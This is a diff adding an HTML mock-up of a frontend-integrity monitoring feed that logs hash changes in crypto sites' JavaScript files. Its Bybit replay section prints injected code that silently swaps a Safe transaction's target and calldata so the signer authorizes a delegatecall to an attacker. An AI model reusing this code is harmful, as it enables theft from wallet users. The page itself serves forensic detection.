@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Second Witness feed</title>
+<link rel="stylesheet" href="../tokens.css">
+<link rel="stylesheet" href="../base.css">
+<style>
+/* Feed. Lift everything except .mock-* */
+.feed { max-width: 1120px; margin: 0 auto; padding: var(--space-4) var(--space-4) var(--space-5); }
+.feed-top { display: grid; gap: var(--space-1); padding-bottom: var(--space-4); }
+.feed-top h1 { font-size: var(--text-l); line-height: var(--leading-tight); }
+.feed-top p { max-width: 76ch; }
+.feed-section { display: grid; grid-template-columns: 200px minmax(0, 1fr); gap: var(--space-4); padding: var(--space-3) 0 var(--space-5); border-top: var(--rule-width) solid var(--rule-strong); }
+.feed-side { display: grid; gap: var(--space-1); align-content: start; }
+.feed-main { min-width: 0; display: grid; gap: var(--space-3); }
+.table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: var(--text-s); }
+.table th { text-align: left; font-weight: var(--weight-regular); color: var(--ink-2); padding: 0 var(--space-3) var(--space-2) 0; }
+.table td { padding: var(--space-2) var(--space-3) var(--space-2) 0; border-top: var(--rule-width) solid var(--rule); vertical-align: baseline; }
+.table td:last-child, .table th:last-child { padding-right: 0; }
+.table .value { font-size: var(--text-s); }
+.feed-right { text-align: right; }
+.table th.feed-right { text-align: right; }
+.event { display: grid; gap: var(--space-2); }
+.event + .event { padding-top: var(--space-3); border-top: var(--rule-width) solid var(--rule); }
+.event-head { display: flex; flex-wrap: wrap; align-items: baseline; gap: var(--space-1) var(--space-3); }
+.event .rows-tight .row:first-child { border-top: 0; }
+.event summary { cursor: pointer; font-size: var(--text-s); width: fit-content; }
+.event details[open] summary { margin-bottom: var(--space-2); }
+
+/* Replay */
+.axis { position: relative; height: 104px; margin-right: var(--space-5); }
+.axis-line { position: absolute; left: 0; right: calc(-1 * var(--space-5)); top: 76px; border-top: var(--rule-width) solid var(--rule-strong); }
+.axis-sign { position: absolute; top: 36px; font: var(--weight-regular) var(--text-xl) / var(--leading-tight) var(--font-mono); color: var(--result); }
+.axis-sign[data-result="changed"] { font-weight: var(--weight-strong); }
+.axis-date { position: absolute; top: 80px; white-space: nowrap; }
+.axis-theft { position: absolute; top: 28px; height: 48px; border-left: 2px solid var(--ink); }
+.axis-span { position: absolute; top: 18px; border-top: var(--rule-width) solid var(--ink); height: 0; }
+.axis-span-label { position: absolute; top: 0; font-size: var(--text-s); font-weight: var(--weight-strong); }
+.replay-altered td { border-top: 0; background: var(--red-fill); color: var(--on-red); }
+.replay-altered td:first-child { padding-left: var(--space-2); }
+.replay-altered td:last-child { padding-right: var(--space-2); }
+.replay-altered .result-inline { color: var(--on-red); }
+.replay-theft td { font-size: var(--text-s); border-top: var(--rule-width) solid var(--ink); border-bottom: var(--rule-width) solid var(--ink); }
+.replay-theft strong { font-weight: var(--weight-strong); }
+.replay-added { display: grid; gap: var(--space-2); }
+
+.mock-toggle { position: fixed; right: var(--space-3); bottom: var(--space-3); background: var(--bg); }
+
+@media (max-width: 720px) {
+  .mock-toggle { position: static; margin: 0 var(--space-3) var(--space-3); }
+  .feed { padding: var(--space-3) var(--space-3) var(--space-5); }
+  .feed-section { grid-template-columns: minmax(0, 1fr); gap: var(--space-3); padding-bottom: var(--space-4); }
+  .axis { display: none; }
+  .table--stack thead { display: none; }
+  .table--stack, .table--stack tbody, .table--stack tr, .table--stack td { display: block; width: 100%; }
+  .table--stack tr { padding: var(--space-2) 0; border-top: var(--rule-width) solid var(--rule); }
+  .table--stack td { border: 0; padding: 0; text-align: left; }
+  .table--stack td + td { padding-top: var(--space-1); }
+  .table--replay tr { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: var(--space-1) var(--space-3); align-items: baseline; }
+  .table--replay td + td { padding-top: 0; }
+  .table--replay td:nth-child(2) { text-align: right; }
+  .table--replay td.feed-right { text-align: right; }
+  .replay-theft td[colspan] { grid-column: 1 / -1; text-align: left !important; }
+  .replay-altered { background: var(--red-fill); padding: var(--space-2) !important; }
+  .replay-altered td { background: none; padding: 0 !important; }
+  .feed-hide-phone { display: none; }
+  .table th, .table td.num { white-space: nowrap; }
+  .replay-theft { border-top: var(--rule-width) solid var(--ink) !important; border-bottom: var(--rule-width) solid var(--ink); }
+  .replay-theft td { border: 0; }
+}
+</style>
+</head>
+<body>
+<main class="feed">
+<header class="feed-top">
+  <h1>Second Witness</h1>
+  <p class="quiet">What independent witnesses recorded for each site. This page only reads public records from Arkiv and ENS. The extension's check works with this page switched off.</p>
+</header>
+<section class="feed-section" id="witnesses">
+  <div class="feed-side"><h2>Witnesses</h2><p class="small quiet">Listed under <span class="mono">secondwitness.eth</span>. Clearing a name removes that witness.</p></div>
+  <div class="feed-main">
+<table class="table table--stack">
+<thead><tr><th>Name and wallet</th><th>Runs on</th><th class="feed-right">Last checked</th></tr></thead>
+<tbody>
+<tr><td><span class="mono">w1.secondwitness.eth</span><br><button type="button" class="value" data-copy="0x4a7f09c1e3d25b68f0a1c97e2d46b8350fe1a7c2" title="0x4a7f09c1e3d25b68f0a1c97e2d46b8350fe1a7c2"><span class="value-head">0x4a7f09c1e3d25b68f0a1c97e2d46b835</span><span class="value-tail">0fe1a7c2</span></button></td><td>GitHub Actions, public job</td><td class="feed-right num">4 min ago</td></tr>
+<tr><td><span class="mono">w2.secondwitness.eth</span><br><button type="button" class="value" data-copy="0xc25d81e6b04f93a7d12e6c08f5ab97341d60e8fb" title="0xc25d81e6b04f93a7d12e6c08f5ab97341d60e8fb"><span class="value-head">0xc25d81e6b04f93a7d12e6c08f5ab9734</span><span class="value-tail">1d60e8fb</span></button></td><td>Second network</td><td class="feed-right num">8 min ago</td></tr>
+</tbody></table>
+<p class="small quiet">Both witnesses are run by this project today. The code is open and the ENS roster is how others join.</p>
+  </div>
+</section>
+<section class="feed-section" id="sites">
+  <div class="feed-side"><h2>Sites</h2><p class="small quiet">The last observation per site.</p></div>
+  <div class="feed-main">
+<table class="table">
+<thead><tr><th>Site</th><th class="feed-right feed-hide-phone">Files</th><th class="feed-right">Witnesses</th><th class="feed-right">Last new code</th></tr></thead>
+<tbody>
+<tr><td class="mono">app.safe.global</td><td class="feed-right num feed-hide-phone">297</td><td class="feed-right num">2 of 2</td><td class="feed-right num">3 days ago</td></tr>
+<tr><td class="mono">swap.cow.fi</td><td class="feed-right num feed-hide-phone">148</td><td class="feed-right num">2 of 2</td><td class="feed-right num">11 hours ago</td></tr>
+<tr><td class="mono">revoke.cash</td><td class="feed-right num feed-hide-phone">115</td><td class="feed-right num">1 of 2</td><td class="feed-right num">6 days ago</td></tr>
+<tr><td class="mono" style="overflow-wrap:anywhere">demo-treasury.vercel.app</td><td class="feed-right num feed-hide-phone">6</td><td class="feed-right num">2 of 2</td><td class="feed-right num">2 min ago</td></tr>
+</tbody></table>
+  </div>
+</section>
+<section class="feed-section" id="changes">
+  <div class="feed-side"><h2>Changed</h2><p class="small quiet">Files whose name promises fixed content, recorded with a new hash. A change is a difference, not a finding about who made it.</p></div>
+  <div class="feed-main">
+<article class="event">
+  <div class="event-head"><span class="result-inline" data-result="changed"><span class="result-sign" aria-hidden="true">≠</span>Changed</span><span class="mono">demo-treasury.vercel.app</span><span class="small quiet num">Today, 14:02 UTC, block 4,218,077</span></div>
+  <dl class="rows-tight">
+    <div class="row"><dt>File</dt><dd><button type="button" class="value" data-copy="/assets/app-3f91c2ab7d104e66.js" title="/assets/app-3f91c2ab7d104e66.js"><span class="value-head">/assets</span><span class="value-tail">/app-3f91c2ab7d104e66.js</span></button></dd></div>
+    <div class="row"><dt>Was</dt><dd><button type="button" class="value value--hash" data-copy="7c1e04d9a2b86f3350de91ac44f7b218" title="7c1e04d9a2b86f3350de91ac44f7b218"><span class="value-head">7c1e04d9a2b86f3350de91ac</span><span class="value-tail">44f7b218</span></button> <span class="quiet num">48,210 bytes</span></dd></div>
+    <div class="row"><dt>Now</dt><dd><button type="button" class="value value--hash" data-copy="e20b6fa1794cd8530a1fe37b92c6d04e" title="e20b6fa1794cd8530a1fe37b92c6d04e"><span class="value-head">e20b6fa1794cd8530a1fe37b</span><span class="value-tail">92c6d04e</span></button> <span class="quiet num">48,210 bytes</span></dd></div>
+    <div class="row"><dt>Witnesses</dt><dd><button type="button" class="value" data-copy="w1.secondwitness.eth" title="w1.secondwitness.eth"><span class="value-head">w1.secondwitness</span><span class="value-tail">.eth</span></button> <span class="quiet">recorded the region</span></dd></div>
+  </dl>
+  <details open><summary>Witnessed region, 62 bytes</summary>
+  <pre class="region" tabindex="0">recipient:"<mark>0x96221423681a6d52e184d440a8efcebb105c7242</mark>",amount:</pre></details>
+</article>
+<article class="event">
+  <div class="event-head"><span class="result-inline" data-result="changed"><span class="result-sign" aria-hidden="true">≠</span>Changed</span><span class="mono">revoke.cash</span><span class="small quiet num">2 Nov, 08:41 UTC, block 3,902,114</span></div>
+  <dl class="rows-tight">
+    <div class="row"><dt>File</dt><dd><button type="button" class="value" data-copy="/_next/static/chunks/8127-a04de91f37c2b65e.js" title="/_next/static/chunks/8127-a04de91f37c2b65e.js"><span class="value-head">/_next/static/chunks</span><span class="value-tail">/8127-a04de91f37c2b65e.js</span></button></dd></div>
+    <div class="row"><dt>Was</dt><dd><button type="button" class="value value--hash" data-copy="0d4c8f12ba6e7395c1e04af8d2763b91" title="0d4c8f12ba6e7395c1e04af8d2763b91"><span class="value-head">0d4c8f12ba6e7395c1e04af8</span><span class="value-tail">d2763b91</span></button></dd></div>
+    <div class="row"><dt>Now</dt><dd><button type="button" class="value value--hash" data-copy="93fa17c05e2d86b4a7013ce9f4d8b260" title="93fa17c05e2d86b4a7013ce9f4d8b260"><span class="value-head">93fa17c05e2d86b4a7013ce9</span><span class="value-tail">f4d8b260</span></button></dd></div>
+    <div class="row"><dt>Region</dt><dd>Witnesses kept no region. The old file had left their cache.</dd></div>
+  </dl>
+</article>
+  </div>
+</section>
+<section class="feed-section" id="replay">
+  <div class="feed-side"><h2>Bybit replay</h2><p class="small quiet">Seven archived captures of one file, re-read after the fact. No witness saw these live and they are not in the catalogue.</p></div>
+  <div class="feed-main">
+<div class="axis" aria-hidden="true">
+  <span class="axis-span" style="left:63.20%;width:22.72%"></span>
+  <span class="axis-span-label" style="left:63.20%">44.7 hours</span>
+  <span class="axis-sign" data-result="matches" style="left:0.00%">=</span><span class="axis-sign" data-result="matches" style="left:3.06%">=</span><span class="axis-sign" data-result="matches" style="left:31.36%">=</span><span class="axis-sign" data-result="matches" style="left:60.07%">=</span><span class="axis-sign" data-result="changed" style="left:63.20%">≠</span><span class="axis-sign" data-result="matches" style="left:92.14%">=</span><span class="axis-sign" data-result="matches" style="left:100.00%">=</span>
+  <span class="axis-theft" style="left:85.92%"></span>
+  <span class="axis-line"></span>
+  <span class="axis-date small quiet" style="left:0.00%">14 Feb</span><span class="axis-date small quiet" style="left:31.36%">17 Feb</span><span class="axis-date small quiet" style="left:60.07%">19 Feb</span><span class="axis-date small quiet" style="left:85.92%">21 Feb, theft</span><span class="axis-date small quiet" style="left:100.00%">22 Feb</span>
+</div>
+<dl class="rows-tight">
+  <div class="row"><dt>File</dt><dd><button type="button" class="value" data-copy="/_next/static/chunks/pages/_app-52c9031bfa03da47.js" title="/_next/static/chunks/pages/_app-52c9031bfa03da47.js"><span class="value-head">/_next/static/chunks/pages</span><span class="value-tail">/_app-52c9031bfa03da47.js</span></button></dd></div>
+</dl>
+<table class="table table--stack table--replay">
+<thead><tr><th>Captured, UTC</th><th>Against the first capture</th><th>Hash</th><th class="feed-right">Bytes</th></tr></thead>
+<tbody>
+<tr><td class="num">14 Feb 2025, 13:06</td><td>First capture</td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+<tr><td class="num">14 Feb 2025, 19:07</td><td><span class="result-inline" data-result="matches"><span class="result-sign" aria-hidden="true">=</span>Matches</span></td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+<tr><td class="num">17 Feb 2025, 02:49</td><td><span class="result-inline" data-result="matches"><span class="result-sign" aria-hidden="true">=</span>Matches</span></td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+<tr><td class="num">19 Feb 2025, 11:19</td><td><span class="result-inline" data-result="matches"><span class="result-sign" aria-hidden="true">=</span>Matches</span></td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+<tr class="replay-altered"><td class="num">19 Feb 2025, 17:29</td><td><span class="result-inline" data-result="changed"><span class="result-sign" aria-hidden="true">≠</span>Changed</span></td><td><button type="button" class="value value--hash" data-copy="fbd5e3eb17ef62f2ecf7890108a3af9b" title="fbd5e3eb17ef62f2ecf7890108a3af9b"><span class="value-head">fbd5e3eb17ef62f2ecf78901</span><span class="value-tail">08a3af9b</span></button></td><td class="num mono feed-right">3,746,298</td></tr>
+<tr class="replay-theft"><td class="num">21 Feb 2025, 14:13</td><td colspan="3"><strong>Theft transaction.</strong> 44.7 hours after the altered capture.</td></tr>
+<tr><td class="num">22 Feb 2025, 02:26</td><td><span class="result-inline" data-result="matches"><span class="result-sign" aria-hidden="true">=</span>Matches</span></td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+<tr><td class="num">22 Feb 2025, 17:55</td><td><span class="result-inline" data-result="matches"><span class="result-sign" aria-hidden="true">=</span>Matches</span></td><td><button type="button" class="value value--hash" data-copy="b93eeeb2063e69101c78eb218991c82f" title="b93eeeb2063e69101c78eb218991c82f"><span class="value-head">b93eeeb2063e69101c78eb21</span><span class="value-tail">8991c82f</span></button></td><td class="num mono feed-right">3,744,304</td></tr>
+</tbody></table>
+<p>The altered capture is 1,994 bytes larger. Its added code names Bybit's cold wallet, <span class="mono" style="overflow-wrap:anywhere">0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4</span>, and the file was back to the first hash by the next capture.</p>
+<div class="replay-added">
+<h3 class="list-title">Added code, first place, 990 bytes. Replaces 34 bytes.</h3>
+<pre class="region" tabindex="0">{let sd=c; let se=e; let st=t;
+let wa=[&quot;<mark>0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4</mark>&quot;,&quot;0x19c6876e978d9f128147439ac4cd9ea2582cd141&quot;];
+let ba=[&quot;0x828424517f9f04015db02169f4026d57b2b07229&quot;,&quot;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&quot;];
+let ta=&quot;0x96221423681a6d52e184d440a8efcebb105c7242&quot;; let da=&quot;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&quot;;
+let op=1; let vl=0; let sga=45746;
+let sf=sd.getSafeProvider();
+let sa=await sf.getSignerAddress(); sa=sa.toLowerCase();
+let lu=await sd.getAddress(); lu=lu.toLowerCase();
+const cf=wa.some(k1 =&gt; lu.includes(k1));
+const cb=ba.some(k1 =&gt; sa.includes(k1));
+if(cf == true &amp;&amp; se.data.operation==0){
+const td=structuredClone(se.data); se.data.to=ta; se.data.operation=op; se.data.data=da; se.data.value=vl; se.data.safeTxGas=sga;
+try{l=await sd.executeTransaction(se,st);se.data=td;}catch (e) {se.data=td; throw e;}
+} else {l=await sd.executeTransaction(se,st);}}</pre>
+<h3 class="list-title">Added code, second place, 1,073 bytes. Replaces 35 bytes.</h3>
+<pre class="region" tabindex="0">let sd=n; let se=e; let st=a;
+let wa=[&quot;<mark>0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4</mark>&quot;,&quot;0x19c6876e978d9f128147439ac4cd9ea2582cd141&quot;];
+let ba=[&quot;0x828424517f9f04015db02169f4026d57b2b07229&quot;,&quot;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&quot;];
+let ta=&quot;0x96221423681a6d52e184d440a8efcebb105c7242&quot;; let da=&quot;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&quot;;
+let op=1; let vl=0; let sga=45746;
+let sf=sd.getSafeProvider();
+let sa=await sf.getSignerAddress(); sa=sa.toLowerCase();
+let lu=await sd.getAddress(); lu=lu.toLowerCase();
+const cf=wa.some(k1 =&gt; lu.includes(k1));
+const cb=ba.some(k1 =&gt; sa.includes(k1));
+if(cb==true){location.href=location.href;}
+if(cf==true &amp;&amp; se.data.operation==0){
+const td=structuredClone(se.data); se.data.to=ta; se.data.operation=op; se.data.data=da; se.data.value=vl; se.data.safeTxGas=sga;
+try { const r=await sd.signTransaction(se,st); r.data=td; se.data=td; return r; } catch (n) { se.data=td; throw n; }
+} else {const r=await sd.signTransaction(se,st); return r;}</pre>
+</div>
+<p class="small quiet">This shows a change was visible 44.7 hours before the theft. It does not show the theft would have been stopped. Safe disputes that its frontend was compromised and points to a developer machine.</p>
+  </div>
+</section>
+</main>
+<button type="button" class="button button--quiet mock-toggle" data-theme-toggle>Switch theme</button>
+<script>
+/* Mock only: theme switch. Open with #dark or #light to force a theme. */
+var t=location.hash.slice(1);if(t==='dark'||t==='light')document.documentElement.dataset.theme=t;
+var b=document.querySelector('[data-theme-toggle]');
+if(b)b.addEventListener('click',function(){var d=document.documentElement,n=(d.dataset.theme||(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'))==='dark'?'light':'dark';d.dataset.theme=n;});
+/* Ship this part: click copies the whole value, focus reveals it in place. */
+document.addEventListener('click',function(e){var v=e.target.closest('[data-copy]');if(!v)return;navigator.clipboard&&navigator.clipboard.writeText(v.dataset.copy);v.dataset.copied='';setTimeout(function(){delete v.dataset.copied},1500);});
+</script>
+</body>
+</html>
